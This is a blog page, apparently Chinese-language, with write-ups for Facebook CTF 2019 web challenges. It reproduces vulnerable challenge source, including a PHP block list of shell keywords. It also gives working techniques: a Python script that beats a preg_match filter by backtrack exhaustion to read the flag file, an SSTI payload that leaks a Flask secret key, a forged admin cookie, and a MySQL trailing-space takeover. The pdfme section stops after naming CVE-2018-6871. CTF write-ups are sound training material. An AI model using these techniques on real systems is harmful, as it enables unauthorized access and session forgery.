@@ -1,0 +1,2123 @@
+<!DOCTYPE html>
+<html>
+    <!-- title -->
+
+
+
+
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" >
+    <meta name="author" content="damn1t">
+    <meta name="renderer" content="webkit">
+    <meta name="copyright" content="damn1t">
+    <meta name="keywords" content="damn1t | damn1t">
+    <meta name="description" content="404">
+    <meta name="Cache-Control" content="no-cache">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"/>
+    <title>fbctf2019 · Damn World</title>
+    <style type="text/css">
+    @font-face {
+        font-family: 'Oswald-Regular';
+        src: url("/font/Oswald-Regular.ttf");
+    }
+
+    body {
+        margin: 0;
+    }
+
+    header,
+    footer,
+    .back-top,
+    .sidebar,
+    .container,
+    .site-intro-meta,
+    .toc-wrapper {
+        display: none;
+    }
+
+    .site-intro {
+        position: relative;
+        z-index: 3;
+        width: 100%;
+        /* height: 50vh; */
+        overflow: hidden;
+    }
+
+    .site-intro-placeholder {
+        position: absolute;
+        z-index: -2;
+        top: 0;
+        left: 0;
+        width: calc(100% + 300px);
+        height: 100%;
+        background: repeating-linear-gradient(-45deg, #444 0, #444 80px, #333 80px, #333 160px);
+        background-position: center center;
+        transform: translate3d(-226px, 0, 0);
+        animation: gradient-move 2.5s ease-out 0s 1;
+    }
+
+    @keyframes gradient-move {
+        0% {
+            transform: translate3d(-226px, 0, 0);
+        }
+        100% {
+            transform: translate3d(0, 0, 0);
+        }
+    }
+
+</style>
+
+    <link rel="preload" href= /css/style.css?v=20180501 as="style" onload="this.onload=null;this.rel='stylesheet'" />
+    <link rel="stylesheet" href= /css/mobile.css?v=20180501 media="(max-width: 980px)">
+    
+    <link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'" />
+        
+    <!-- /*! loadCSS. [c]2017 Filament Group, Inc. MIT License */
+/* This file is meant as a standalone workflow for
+- testing support for link[rel=preload]
+- enabling async CSS loading in browsers that do not support rel=preload
+- applying rel preload css once loaded, whether supported or not.
+*/ -->
+<script>
+(function( w ){
+	"use strict";
+	// rel=preload support test
+	if( !w.loadCSS ){
+		w.loadCSS = function(){};
+	}
+	// define on the loadCSS obj
+	var rp = loadCSS.relpreload = {};
+	// rel=preload feature support test
+	// runs once and returns a function for compat purposes
+	rp.support = (function(){
+		var ret;
+		try {
+			ret = w.document.createElement( "link" ).relList.supports( "preload" );
+		} catch (e) {
+			ret = false;
+		}
+		return function(){
+			return ret;
+		};
+	})();
+
+	// if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+	// then change that media back to its intended value on load
+	rp.bindMediaToggle = function( link ){
+		// remember existing media attr for ultimate state, or default to 'all'
+		var finalMedia = link.media || "all";
+
+		function enableStylesheet(){
+			link.media = finalMedia;
+		}
+
+		// bind load handlers to enable media
+		if( link.addEventListener ){
+			link.addEventListener( "load", enableStylesheet );
+		} else if( link.attachEvent ){
+			link.attachEvent( "onload", enableStylesheet );
+		}
+
+		// Set rel and non-applicable media type to start an async request
+		// note: timeout allows this to happen async to let rendering continue in IE
+		setTimeout(function(){
+			link.rel = "stylesheet";
+			link.media = "only x";
+		});
+		// also enable media after 3 seconds,
+		// which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+		setTimeout( enableStylesheet, 3000 );
+	};
+
+	// loop through link elements in DOM
+	rp.poly = function(){
+		// double check this to prevent external calls from running
+		if( rp.support() ){
+			return;
+		}
+		var links = w.document.getElementsByTagName( "link" );
+		for( var i = 0; i < links.length; i++ ){
+			var link = links[ i ];
+			// qualify links to those with rel=preload and as=style attrs
+			if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+				// prevent rerunning on link
+				link.setAttribute( "data-loadcss", true );
+				// bind listeners to toggle media back
+				rp.bindMediaToggle( link );
+			}
+		}
+	};
+
+	// if unsupported, run the polyfill
+	if( !rp.support() ){
+		// run once at least
+		rp.poly();
+
+		// rerun poly on an interval until onload
+		var run = w.setInterval( rp.poly, 500 );
+		if( w.addEventListener ){
+			w.addEventListener( "load", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		} else if( w.attachEvent ){
+			w.attachEvent( "onload", function(){
+				rp.poly();
+				w.clearInterval( run );
+			} );
+		}
+	}
+
+
+	// commonjs
+	if( typeof exports !== "undefined" ){
+		exports.loadCSS = loadCSS;
+	}
+	else {
+		w.loadCSS = loadCSS;
+	}
+}( typeof global !== "undefined" ? global : this ) );
+</script>
+
+    <link rel="icon" href= "/assets/Spson.ico" />
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js" as="script" />    
+    <link rel="preload" href="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" as="script" />
+    <link rel="preload" href="/scripts/main.js" as="script" />
+    <link rel="preload" as="font" href="/font/Oswald-Regular.ttf" crossorigin>
+    <link rel="preload" as="font" href="https://at.alicdn.com/t/font_327081_1dta1rlogw17zaor.woff" crossorigin>
+    <!-- 百度统计  -->
+    
+    <!-- 谷歌统计  -->
+    
+</head>
+
+    
+        <body class="post-body">
+    
+    
+<header class="header">
+
+    <div class="read-progress"></div>
+    <div class="header-sidebar-menu">&#xe775;</div>
+    <!-- post页的toggle banner  -->
+    
+    <div class="banner">
+            <div class="blog-title">
+                <a href="/" >damn guys</a>
+            </div>
+            <div class="post-title">
+                <a href="#" class="post-name">fbctf2019</a>
+            </div>
+    </div>
+    
+    <a class="home-link" href=/>damn guys</a>
+</header>
+    <div class="wrapper">
+        <div class="site-intro" style=
+
+
+
+
+
+
+
+
+height:50vh;
+
+>
+    
+    <!-- 主页  -->
+    
+    
+    <!-- 404页  -->
+            
+    <div class="site-intro-placeholder"></div>
+    <div class="site-intro-img" style="background-image: url(/intro/page.jpg)"></div>
+    <div class="site-intro-meta">
+        <!-- 标题  -->
+        <h1 class="intro-title">
+            <!-- 主页  -->
+            
+            fbctf2019
+            <!-- 404 -->
+            
+        </h1>
+        <!-- 副标题 -->
+        <p class="intro-subtitle">
+            <!-- 主页副标题  -->
+            
+            
+            <!-- 404 -->
+            
+        </p>
+        <!-- 文章页meta -->
+        
+            <!-- 文章页标签  -->
+            
+                <div class= post-intro-tags >
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags = "ctf">ctf</a>
+    
+</div>
+            
+            <div class="post-intro-meta">
+                <span class="post-intro-calander iconfont-archer">&#xe676;</span>
+                <span class="post-intro-time">2019/06/12</span>
+                
+                <span id="busuanzi_container_page_pv" class="busuanzi-pv">
+                    <span class="iconfont-archer">&#xe602;</span>
+                    <span id="busuanzi_value_page_pv"></span>
+                </span>
+                
+                <span class="shareWrapper">
+                    <span class="iconfont-archer shareIcon">&#xe71d;</span>
+                    <span class="shareText">Share</span>
+                    <ul class="shareList">
+                        <li class="iconfont-archer share-qr" data-type="qr">&#xe75b;
+                            <div class="share-qrcode"></div>
+                        </li>
+                        <li class="iconfont-archer" data-type="weibo">&#xe619;</li>
+                        <li class="iconfont-archer" data-type="qzone">&#xe62e;</li>
+                        <li class="iconfont-archer" data-type="twitter">&#xe634;</li>
+                        <li class="iconfont-archer" data-type="facebook">&#xe67a;</li>
+                    </ul>
+                </span>
+            </div>
+        
+    </div>
+</div>
+        <script>
+  // load webfont-loader async, and add callback function
+  function async(u, cb, err) {
+    var d = document, t = 'script',
+      o = d.createElement(t),
+      s = d.getElementsByTagName(t)[0];
+    o.src = u;
+    if (cb) { o.addEventListener('load', function (e) { cb(null, e); }, false); }
+    if (err) { o.addEventListener('error', function (e) { err(null, e); }, false); }
+    s.parentNode.insertBefore(o, s);
+  }
+  
+  // get user agent
+  var browser = {
+    versions: function () {
+      var u = window.navigator.userAgent;
+      return {
+        userAgent: u,
+        trident: u.indexOf('Trident') > -1, //IE内核
+        presto: u.indexOf('Presto') > -1, //opera内核
+        webKit: u.indexOf('AppleWebKit') > -1, //苹果、谷歌内核
+        gecko: u.indexOf('Gecko') > -1 && u.indexOf('KHTML') == -1, //火狐内核
+        mobile: !!u.match(/AppleWebKit.*Mobile.*/), //是否为移动终端
+        ios: !!u.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/), //ios终端
+        android: u.indexOf('Android') > -1 || u.indexOf('Linux') > -1, //android终端或者uc浏览器
+        iPhone: u.indexOf('iPhone') > -1 || u.indexOf('Mac') > -1, //是否为iPhone或者安卓QQ浏览器
+        iPad: u.indexOf('iPad') > -1, //是否为iPad
+        webApp: u.indexOf('Safari') == -1, //是否为web应用程序，没有头部与底部
+        weixin: u.indexOf('MicroMessenger') == -1, //是否为微信浏览器
+        uc: u.indexOf('UCBrowser') > -1 //是否为android下的UC浏览器
+      };
+    }()
+  }
+  console.log("userAgent:" + browser.versions.userAgent);
+
+  // callback
+  function fontLoaded() {
+    console.log('font loaded');
+    if (document.getElementsByClassName('site-intro-meta')) {
+      document.getElementsByClassName('intro-title')[0].classList.add('intro-fade-in');
+      document.getElementsByClassName('intro-subtitle')[0].classList.add('intro-fade-in');
+      var postIntroTags = document.getElementsByClassName('post-intro-tags')[0],
+        postIntroMeat = document.getElementsByClassName('post-intro-meta')[0];
+      if (postIntroTags) {
+        postIntroTags.classList.add('post-fade-in');
+      }
+      if (postIntroMeat) {
+        postIntroMeat.classList.add('post-fade-in');
+      }
+    }
+  }
+
+  // UC不支持跨域，所以直接显示
+  function asyncCb(){
+    if (browser.versions.uc) {
+      console.log("UCBrowser");
+      fontLoaded();
+    } else {
+      WebFont.load({
+        custom: {
+          families: ['Oswald-Regular']
+        },
+        loading: function () {  //所有字体开始加载
+          // console.log('loading');
+        },
+        active: function () {  //所有字体已渲染
+          fontLoaded();
+        },
+        inactive: function () { //字体预加载失败，无效字体或浏览器不支持加载
+          console.log('inactive: timeout');
+          fontLoaded();
+        },
+        timeout: 5000 // Set the timeout to two seconds
+      });
+    }
+  }
+
+  function asyncErr(){
+    console.warn('script load from CDN failed, will load local script')
+  }
+
+  var asyncLoadWithFallBack = function(arr, success, reject) {
+      var currReject = function(){
+        reject()
+        arr.shift()
+        if(arr.length)
+          async(arr[0], success, currReject)
+        }
+
+      async(arr[0], success, currReject)
+  }
+
+  asyncLoadWithFallBack([
+    "https://cdn.jsdelivr.net/npm/webfontloader@1.6.28/webfontloader.min.js", 
+    "https://cdn.bootcss.com/webfont/1.6.28/webfontloader.js",
+    "/lib/webfontloader.min.js"
+  ], asyncCb, asyncErr)
+</script>        
+        <img class="loading" src="/assets/loading.svg" style="display: block; margin: 6rem auto 0 auto; width: 6rem; height: 6rem;" />
+        <div class="container container-unloaded">
+            <main class="main post-page">
+    <article class="article-entry">
+        <h1 id="Facebook-ctf-2019"><a href="#Facebook-ctf-2019" class="headerlink" title="Facebook ctf 2019"></a>Facebook ctf 2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="rceservice"><a href="#rceservice" class="headerlink" title="rceservice"></a>rceservice</h3><p>题目描述：</p>
+<blockquote>
+<p>We created this web interface to run commands on our servers, but since we haven’t figured out how to secure it yet we only let you run ‘ls’</p>
+<p><a href="http://challenges.fbctf.com:8085" target="_blank" rel="noopener">http://challenges.fbctf.com:8085</a></p>
+<p>(This problem does not require any brute force or scanning.<br>We will ban your team if we detect brute force or scanning).</p>
+</blockquote>
+<p>要求用<code>json</code>格式传送payload<br><img src="https://ramadistra.dev/static/69bcde5f2a66779950b04b31626c4e7a/92980/initial.webp" alt=""></p>
+<p>我们尝试<code>ls</code>：<code>{&quot;cmd&quot;:&quot;ls&quot;}</code></p>
+<p><img src="https://ramadistra.dev/static/ef292e7c05d67c2b8f563690c770eb69/889a8/ls.webp" alt=""></p>
+<p>题目源码：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">putenv(&apos;PATH=/home/rceservice/jail&apos;);</span><br><span class="line"></span><br><span class="line">if (isset($_REQUEST[&apos;cmd&apos;])) &#123;</span><br><span class="line">  $json = $_REQUEST[&apos;cmd&apos;];</span><br><span class="line"></span><br><span class="line">  if (!is_string($json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; elseif (preg_match(&apos;/^.*(alias|bg|bind|break|builtin|case|cd|command|compgen|complete|continue|declare|dirs|disown|echo|enable|eval|exec|exit|export|fc|fg|getopts|hash|help|history|if|jobs|kill|let|local|logout|popd|printf|pushd|pwd|read|readonly|return|set|shift|shopt|source|suspend|test|times|trap|type|typeset|ulimit|umask|unalias|unset|until|wait|while|[\x00-\x1FA-Z0-9!#-\/;-@\[-`|~\x7F]+).*$/&apos;, $json)) &#123;</span><br><span class="line">    echo &apos;Hacking attempt detected&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &apos;Attempting to run command:&lt;br/&gt;&apos;;</span><br><span class="line">    $cmd = json_decode($json, true)[&apos;cmd&apos;];</span><br><span class="line">    if ($cmd !== NULL) &#123;</span><br><span class="line">      system($cmd);</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      echo &apos;Invalid input&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">    echo &apos;&lt;br/&gt;&lt;br/&gt;&apos;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>暴躁过滤，在线砍人<br>但是我们看到了<code>preg_match</code>,就会想到p神曾经提到的PRCE，利用如下的exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">payload = &apos;&#123;&quot;cmd&quot;:&quot;/bin/cat /home/rceservice/flag&quot;,&quot;zz&quot;:&quot;&apos; + &quot;a&quot;*(1000000) + &apos;&quot;&#125;&apos;</span><br><span class="line"></span><br><span class="line">res = requests.post(&quot;http://challenges.fbctf.com:8085/&quot;, data=&#123;&quot;cmd&quot;:payload&#125;)</span><br><span class="line">print(res.text)</span><br></pre></td></tr></table></figure></p>
+<p>另一种方法，同样是<code>preg_match</code>的问题，由于它会努力去匹配第一行，所以我们可以利用<strong>多行</strong>的方法</p>
+<p><img src="https://i.loli.net/2019/06/10/5cfe6008e1fb886158.png" alt=""></p>
+<p>尝试直接<code>cat</code>，但是返回了空白<br>我们返回去查看源代码：<code>putenv(&#39;PATH=/home/rceservice/jail&#39;);</code>，jail应用于当前环境，又根据题目描述的提示–“只允许执行ls命令”，即jail包含了执行<code>ls</code>的二进制文件，所以我们可以直接拉出<code>cat</code>的路径：<code>&quot;cmd&quot;: &quot;/bin/cat /home/rceservice/flag&quot;</code></p>
+<blockquote>
+<p>注：Linux命令的位置：/bin,/usr/bin，默认都是全体用户使用，/sbin,/usr/sbin,默认root用户使用</p>
+</blockquote>
+<h3 id="events"><a href="#events" class="headerlink" title="events"></a>events</h3><p>题目描述：</p>
+<blockquote>
+<p>I heard cookies and string formatting are safe in 2019?</p>
+<p><a href="http://challenges.fbctf.com:8083" target="_blank" rel="noopener">http://challenges.fbctf.com:8083</a></p>
+<p>(This problem does not require any brute force or scanning. We will ban your team if we detect brute force or scanning).</p>
+</blockquote>
+<p>登录<br><img src="https://i.loli.net/2019/06/10/5cfe6bab2297446330.png" alt=""></p>
+<p>观察cookie：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ImEi.XP5j-w.rHcMilGKzEg1FYfcEOR6iqa-B9A</span><br></pre></td></tr></table></figure></p>
+<p>似乎有三段，但加密方式未知，密钥未知<br>我们尝试提交数据，注意到有三个参数需要提交：<br><img src="https://i.loli.net/2019/06/10/5cfe6cc46116a77936.png" alt=""></p>
+<p>既然提示了<code>cookie</code>和<code>string format</code>，admin是未允许的状态，所以思路是篡改cookie，伪装为admin，继而拿到flag，通常有一个思路是：利用SSTI，获取密钥，然后重新签名生成cookie。所以如何利用SSTI呢？<br>通过一番尝试，三个参数中，<code>event_important</code>是可利用点</p>
+<ul>
+<li>我们输入<code>__dict__</code>，成功回显</li>
+</ul>
+<p><img src="https://i.loli.net/2019/06/10/5cfe7273070fc54701.png" alt=""></p>
+<ul>
+<li><p>查找配置文件：<code>__class__.__init__.__globals__[app].config</code><br><img src="https://i.loli.net/2019/06/10/5cfe73cb3856843642.png" alt=""></p>
+</li>
+<li><p>于是进行签名</p>
+</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask</span><br><span class="line">from flask.sessions import SecureCookieSessionInterface</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = b&apos;fb+wwn!n1yo+9c(9s6!_3o#nqm&amp;&amp;_ej$tez)$_ik36n8d7o6mr#y&apos;</span><br><span class="line"></span><br><span class="line">session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)</span><br><span class="line"></span><br><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">def index():</span><br><span class="line">    print(session_serializer.dumps(&quot;admin&quot;))</span><br><span class="line"></span><br><span class="line">index()</span><br></pre></td></tr></table></figure>
+<p>将得到的cookie去修改原<code>user</code>的cookie即可得到flag</p>
+<h3 id="products-manager"><a href="#products-manager" class="headerlink" title="products manager"></a>products manager</h3><p>题目给出了源码：</p>
+<ul>
+<li>在db.php中：</li>
+</ul>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line">INSERT INTO products VALUES(&apos;facebook&apos;, sha256(....), &apos;FLAG_HERE&apos;);</span><br><span class="line">INSERT INTO products VALUES(&apos;messenger&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;instagram&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;whatsapp&apos;, sha256(....), ....);</span><br><span class="line">INSERT INTO products VALUES(&apos;oculus-rift&apos;, sha256(....), ....);</span><br><span class="line">*/</span><br></pre></td></tr></table></figure>
+<p>给出了表结构，且提示很明显，再看主页面：<br><img src="https://i.loli.net/2019/06/11/5cfe8685b49df61035.png" alt=""></p>
+<p>三个功能，add是添加产品<br><img src="https://i.loli.net/2019/06/11/5cfe86c76c0c145917.png" alt=""></p>
+<p>view可以查询<br><img src="https://i.loli.net/2019/06/11/5cfe8707a0af441607.png" alt=""><br>我们再查看view.php:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if (isset($name) &amp;&amp; $name !== &quot;&quot;</span><br><span class="line">      &amp;&amp; isset($secret) &amp;&amp; $secret !== &quot;&quot;) &#123;</span><br><span class="line">  if (check_name_secret($name, hash(&apos;sha256&apos;, $secret)) === false) &#123;</span><br><span class="line">    return &quot;Incorrect name or secret, please try again&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">  $product = get_product($name);</span><br><span class="line">  echo &quot;&lt;p&gt;Product details:&quot;;</span><br><span class="line">  echo &quot;&lt;ul&gt;&lt;li&gt;&quot; . htmlentities($product[&apos;name&apos;]) . &quot;&lt;/li&gt;&quot;;</span><br><span class="line">  echo &quot;&lt;li&gt;&quot; . htmlentities($product[&apos;description&apos;]) . &quot;&lt;/li&gt;&lt;/ul&gt;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure></p>
+<p>/db.php::check_name_secret源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">function check_name_secret($name, $secret) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $valid = false;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name FROM products WHERE name = ? AND secret = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;ss&quot;, $name, $secret);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  if ($res-&gt;fetch_assoc() !== null) &#123;</span><br><span class="line">    $valid = true;</span><br><span class="line">  &#125;</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $valid;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>/db.php::get_product源码如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function get_product($name) &#123;</span><br><span class="line">  global $db;</span><br><span class="line">  $statement = $db-&gt;prepare(</span><br><span class="line">    &quot;SELECT name, description FROM products WHERE name = ?&quot;</span><br><span class="line">  );</span><br><span class="line">  check_errors($statement);</span><br><span class="line">  $statement-&gt;bind_param(&quot;s&quot;, $name);</span><br><span class="line">  check_errors($statement-&gt;execute());</span><br><span class="line">  $res = $statement-&gt;get_result();</span><br><span class="line">  check_errors($res);</span><br><span class="line">  $product = $res-&gt;fetch_assoc();</span><br><span class="line">  $statement-&gt;close();</span><br><span class="line">  return $product;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点<br>这里涉及到mysql的一个问题，查询的时候将会忽略字符串尾部的空格<br><img src="https://i.loli.net/2019/06/11/5cfe897b3282f80821.png" alt=""></p>
+<p>于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag</p>
+<h3 id="pdfme"><a href="#pdfme" class="headerlink" title="pdfme"></a>pdfme</h3><p><img src="https://github.com/AidanFray/CTF_Writeups/raw/master/2019/FacebookCTF/pdfme/images/start.png" alt=""><br>只能上传<code>.fods</code>文件，在网上找了个：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;office:document xmlns:office=&quot;urn:oasis:names:tc:opendocument:xmlns:office:1.0&quot;  xmlns:style=&quot;urn:oasis:names:tc:opendocument:xmlns:style:1.0&quot;  xmlns:text=&quot;urn:oasis:names:tc:opendocument:xmlns:text:1.0&quot;  xmlns:table=&quot;urn:oasis:names:tc:opendocument:xmlns:table:1.0&quot;  xmlns:draw=&quot;urn:oasis:names:tc:opendocument:xmlns:drawing:1.0&quot;  xmlns:fo=&quot;urn:oasis:names:tc:opendocument:xmlns:xsl-fo-compatible:1.0&quot;  xmlns:xlink=&quot;http://www.w3.org/1999/xlink&quot;  xmlns:dc=&quot;http://purl.org/dc/elements/1.1/&quot;  xmlns:meta=&quot;urn:oasis:names:tc:opendocument:xmlns:meta:1.0&quot;  xmlns:number=&quot;urn:oasis:names:tc:opendocument:xmlns:datastyle:1.0&quot;  xmlns:presentation=&quot;urn:oasis:names:tc:opendocument:xmlns:presentation:1.0&quot;  xmlns:svg=&quot;urn:oasis:names:tc:opendocument:xmlns:svg-compatible:1.0&quot;  xmlns:chart=&quot;urn:oasis:names:tc:opendocument:xmlns:chart:1.0&quot;  xmlns:dr3d=&quot;urn:oasis:names:tc:opendocument:xmlns:dr3d:1.0&quot;  xmlns:math=&quot;http://www.w3.org/1998/Math/MathML&quot;  xmlns:form=&quot;urn:oasis:names:tc:opendocument:xmlns:form:1.0&quot;  xmlns:script=&quot;urn:oasis:names:tc:opendocument:xmlns:script:1.0&quot;  xmlns:config=&quot;urn:oasis:names:tc:opendocument:xmlns:config:1.0&quot;  xmlns:ooo=&quot;http://openoffice.org/2004/office&quot;  xmlns:ooow=&quot;http://openoffice.org/2004/writer&quot;  xmlns:oooc=&quot;http://openoffice.org/2004/calc&quot;  xmlns:dom=&quot;http://www.w3.org/2001/xml-events&quot;  xmlns:xforms=&quot;http://www.w3.org/2002/xforms&quot;  xmlns:xsd=&quot;http://www.w3.org/2001/XMLSchema&quot;  xmlns:xsi=&quot;http://www.w3.org/2001/XMLSchema-instance&quot;  xmlns:rpt=&quot;http://openoffice.org/2005/report&quot;  xmlns:of=&quot;urn:oasis:names:tc:opendocument:xmlns:of:1.2&quot;  xmlns:xhtml=&quot;http://www.w3.org/1999/xhtml&quot;  xmlns:grddl=&quot;http://www.w3.org/2003/g/data-view#&quot;  xmlns:tableooo=&quot;http://openoffice.org/2009/table&quot;  xmlns:drawooo=&quot;http://openoffice.org/2010/draw&quot;  xmlns:calcext=&quot;urn:org:documentfoundation:names:experimental:calc:xmlns:calcext:1.0&quot;  xmlns:loext=&quot;urn:org:documentfoundation:names:experimental:office:xmlns:loext:1.0&quot;  xmlns:field=&quot;urn:openoffice:names:experimental:ooo-ms-interop:xmlns:field:1.0&quot;  xmlns:formx=&quot;urn:openoffice:names:experimental:ooxml-odf-interop:xmlns:form:1.0&quot;  xmlns:css3t=&quot;http://www.w3.org/TR/css3-text/&quot; office:version=&quot;1.2&quot; office:mimetype=&quot;application/vnd.oasis.opendocument.spreadsheet&quot;&gt;</span><br><span class="line">    &lt;office:body&gt;</span><br><span class="line">        &lt;office:spreadsheet&gt;</span><br><span class="line">            &lt;table:table table:name=&quot;1&quot;&gt;</span><br><span class="line">                &lt;table:table-column/&gt;</span><br><span class="line">                &lt;table:table-row&gt;</span><br><span class="line">                    &lt;table:table-cell office:value-type=&quot;string&quot; calcext:value-type=&quot;string&quot;&gt;</span><br><span class="line">                        &lt;text:p&gt;TEXT&lt;/text:p&gt;</span><br><span class="line">                    &lt;/table:table-cell&gt;</span><br><span class="line">                &lt;/table:table-row&gt;</span><br><span class="line">                &lt;table:table-row&gt;&lt;/table:table-row&gt;</span><br><span class="line">            &lt;/table:table&gt;</span><br><span class="line">            &lt;table:named-expressions/&gt;</span><br><span class="line">        &lt;/office:spreadsheet&gt;</span><br><span class="line">    &lt;/office:body&gt;</span><br><span class="line">&lt;/office:document&gt;</span><br></pre></td></tr></table></figure></p>
+<p>他会渲染为pdf：</p>
+<p><img src="https://i.loli.net/2019/06/11/5cfe8ff9c303f36290.png" alt=""><br>将pdf下载下来，利用exiftool查看文件信息：<br><img src="https://i.loli.net/2019/06/11/5cff2e6c83e7924512.png" alt=""><br>注意到<strong>libreoffice</strong>，查找相关漏洞，最后落到了<a href="https://www.exploit-db.com/exploits/44022" target="_blank" rel="noopener">CVE-2018-6871</a>，差不多是协议的问题：</p>
+<blockquote>
+<p>For protocols that are not supported, such as ftp: // or file: //, WEBSERVICE returns the #VALUE! error value.</p>
+<p>In LibreOffice, these restrictions are not implemented before 5.4.5/6.0.1</p>
+</blockquote>
